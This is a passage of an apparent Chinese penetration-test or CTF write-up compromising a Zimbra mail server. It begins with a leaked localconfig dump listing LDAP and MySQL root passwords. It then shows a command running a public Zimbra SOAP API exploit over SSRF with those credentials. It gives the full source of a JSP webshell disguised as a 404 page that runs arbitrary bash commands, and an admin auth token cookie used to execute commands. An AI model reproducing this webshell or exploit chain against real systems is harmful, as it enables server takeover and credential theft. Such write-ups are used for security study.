  &lt;key name="zimbra_gid"&gt;
    &lt;value&gt;995&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="ldap_amavis_password"&gt;
    &lt;value&gt;rhqkAlU5n_&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="ldap_url"&gt;
    &lt;value&gt;ldap://mail.cslab.com:389&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="ldap_starttls_supported"&gt;
    &lt;value&gt;1&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="smtp_source"&gt;
    &lt;value&gt;admin@mail.cslab.com&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="ssl_allow_untrusted_certs"&gt;
    &lt;value&gt;false&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="zimbra_user"&gt;
    &lt;value&gt;zimbra&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="ldap_replication_password"&gt;
    &lt;value&gt;rhqkAlU5n_&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="postfix_setgid_group"&gt;
    &lt;value&gt;postdrop&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="zimbra_mysql_password"&gt;
    &lt;value&gt;i.OURb7v4t.oE_ttiws_9dcYz2&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="smtp_notify"&gt;
    &lt;value&gt;yes&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="ldap_postfix_password"&gt;
    &lt;value&gt;rhqkAlU5n_&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="mysql_root_password"&gt;
    &lt;value&gt;P4YtmUFaty8FlD3a7DrqiEXdURMwVZf0&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="mailboxd_server"&gt;
    &lt;value&gt;jetty&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="ldap_bes_searcher_password"&gt;
    &lt;value&gt;rhqkAlU5n_&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="zimbra_mysql_connector_maxActive"&gt;
    &lt;value&gt;100&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="ldap_nginx_password"&gt;
    &lt;value&gt;rhqkAlU5n_&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="ldap_master_url"&gt;
    &lt;value&gt;ldap://mail.cslab.com:389&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="zimbra_ldap_password"&gt;
    &lt;value&gt;rhqkAlU5n_&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="snmp_trap_host"&gt;
    &lt;value&gt;mail.cslab.com&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="zimbra_zmjava_options"&gt;
    &lt;value&gt;-Xmx256m -Dhttps.protocols=TLSv1,TLSv1.1,TLSv1.2 -Djdk.tls.client.protocols=TLSv1,TLSv1.1,TLSv1.2 -Djava.net.preferIPv4Stack=true&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="ldap_accesslog_maxsize"&gt;
    &lt;value&gt;18238930944&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="smtp_destination"&gt;
    &lt;value&gt;admin@mail.cslab.com&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="zimbra_mail_service_port"&gt;
    &lt;value&gt;8080&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="mysql_bind_address"&gt;
    &lt;value&gt;127.0.0.1&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="mailboxd_truststore_password"&gt;
    &lt;value&gt;changeit&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="ldap_host"&gt;
    &lt;value&gt;mail.cslab.com&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="zmtrainsa_cleanup_host"&gt;
    &lt;value&gt;true&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="antispam_mysql_host"&gt;
    &lt;value&gt;127.0.0.1&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="zimbra_zmprov_default_to_ldap"&gt;
    &lt;value&gt;false&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="zimbra_uid"&gt;
    &lt;value&gt;997&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="mailboxd_java_options"&gt;
    &lt;value&gt;-server -Dhttps.protocols=TLSv1,TLSv1.1,TLSv1.2 -Djdk.tls.client.protocols=TLSv1,TLSv1.1,TLSv1.2 -Djava.awt.headless=true -Dsun.net.inetaddr.ttl=${networkaddress_cache_ttl} -Dorg.apache.jasper.compiler.disablejsr199=true -XX:+UseConcMarkSweepGC -XX:PermSize=128m -XX:MaxPermSize=350m -XX:SoftRefLRUPolicyMSPerMB=1 -verbose:gc -XX:+PrintGCDetails -XX:+PrintGCDateStamps -XX:+PrintGCApplicationStoppedTime -XX:-OmitStackTraceInFastThrow -Xloggc:/opt/zimbra/log/gc.log -XX:-UseGCLogFileRotation -XX:NumberOfGCLogFiles=20 -XX:GCLogFileSize=4096K -Djava.net.preferIPv4Stack=true&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="ldap_is_master"&gt;
    &lt;value&gt;true&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="zimbra_server_hostname"&gt;
    &lt;value&gt;mail.cslab.com&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="ldap_root_password"&gt;
    &lt;value&gt;rhqkAlU5n_&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="postfix_mail_owner"&gt;
    &lt;value&gt;postfix&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="zimbra_ldap_userdn"&gt;
    &lt;value&gt;uid=zimbra,cn=admins,cn=zimbra&lt;/value&gt;
  &lt;/key&gt;
  &lt;key name="ldap_db_maxsize"&gt;
    &lt;value&gt;18238930944&lt;/value&gt;
  &lt;/key&gt;
&lt;/localconfig&gt;
</pre></p><hr><i><small>Powered by Jetty://</small></i><hr/>

</body>

</html>

```

拿到ldap\_root\_password

```
zimbra
rhqkAlU5n_
```

直接打exp<https://github.com/3gstudent/Homework-of-Python/blob/master/Zimbra_SOAP_API_Manage.py>

```
python3 Zimbra_SOAP_API_Manage.py https://127.0.0.0:8889 zimbra rhqkAlU5n_ ssrf
```

选择功能

```
uploadwebshell
```

传shell.jsp

```
<!-- gh/aels -->
 
<H1><CENTER>404 Not Found</CENTER></H1>

<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    String output = "";
    String error = "";
    if(cmd != null) {
        String[] commandAndArgs = new String[]{ "/bin/bash", "-c", cmd };
        String s = null;
        Process process = Runtime.getRuntime().exec(commandAndArgs);
        InputStream inputStream = process.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
        Thread.sleep(2000);
        while(process.isAlive()) Thread.sleep(100);
        while((s = reader.readLine()) != null) { output += s+"
"; }
        reader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
        while((s = reader.readLine()) != null) { error += s+"
"; }
    }
%>

<FORM><INPUT name=cmd style=border:0;display:block; type=text value='<%=cmd %>'></FORM>

<pre>
    <%=output %>
    <%=error %>
</pre>

```

然后有一个弹窗

​![](images/20250213173439-bee1d120-e9ed-1.png)​

Cookie传入

```
ZM_ADMIN_AUTH_TOKEN=0_c49cbfdfbbda6ab4b301ae8989f4f95f3ca82c8a_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313733383535333638323631383b61646d696e3d313a313b747970653d363a7a696d6272613b7469643d393a3933333134333038303b
```

就可以执行命令了

​![](images/20250213173447-c3a4071c-e9ed-1.png)​

​

‍
